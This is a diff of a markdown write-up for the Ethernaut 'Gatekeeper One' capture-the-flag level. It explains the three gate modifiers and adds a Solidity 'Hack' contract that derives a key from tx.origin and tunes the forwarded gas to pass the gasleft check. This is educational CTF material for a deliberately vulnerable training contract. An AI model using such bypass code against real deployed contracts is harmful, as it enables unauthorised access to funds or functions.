@@ -186,7 +186,28 @@ contract ElevatAttack {
 
 # 13. Gatekeeper One 
 * Here there are 3 modifiers that we need to crack in that first GateOne is same as the Telephone challange we just have to call the function from an contract.
-* Second one uses an inbuilt function named gasleft() which is used to return the gas left in that contract.
-* Third one looks challenging but it just takes specific bits from each inputs and checks the equality. We can see tx.origin is the key used here.
-* Here
+* Second one uses an inbuilt function named ```gasleft()``` which is used to return the gas left in that contract it checks whether the ```gasleft()``` is multiple of 8191. 
+* Third one looks challenging but it just takes specific bits from each inputs and checks the equality. We can see ```tx.origin``` is the key used here.
+```
+  contract Hack {
+
+    function enter(address _target, uint gas) external {
+        IGateKeeperOne target = IGateKeeperOne(_target);
+        // Modifier 3
+
+        // uint64 k; 
+        // Req3: uint32(k) == uint16(uint160(tx.origin)));
+        // Req1: uint32(k) == uint16(k);
+        uint16 k16 = uint16(uint160(tx.origin));
+        // Req2: uint32(k) != k;
+        uint64 k64 = uint64(1 << 63) + uint64(k16);
+        
+        
+        bytes8 key = bytes8(k64);
+        require(gas < 8191, "gas > 8191"); //Modifier 2
+        require( target.enter{gas: 8191 * 10 + gas}(key), "failed");
+
+    }
+}
+  ```
 
